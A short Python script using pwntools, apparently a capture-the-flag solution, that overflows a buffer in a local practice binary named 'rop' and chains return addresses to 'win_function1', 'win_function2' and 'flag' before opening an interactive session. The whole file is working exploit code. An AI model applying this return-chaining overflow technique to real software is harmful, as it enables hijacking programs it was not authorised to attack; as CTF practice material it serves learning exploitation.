from pwn import *

p = process("./rop")
elf = ELF("./rop")

payload = "a" * 0x18 + "b" * 0x4 + p32(elf.sym["win_function1"]) + p32(elf.sym["win_function2"]) + p32(elf.sym["flag"]) + p32(0xBAAAAAAD)
p.sendlineafter("Enter your input> " , payload)

p.interactive()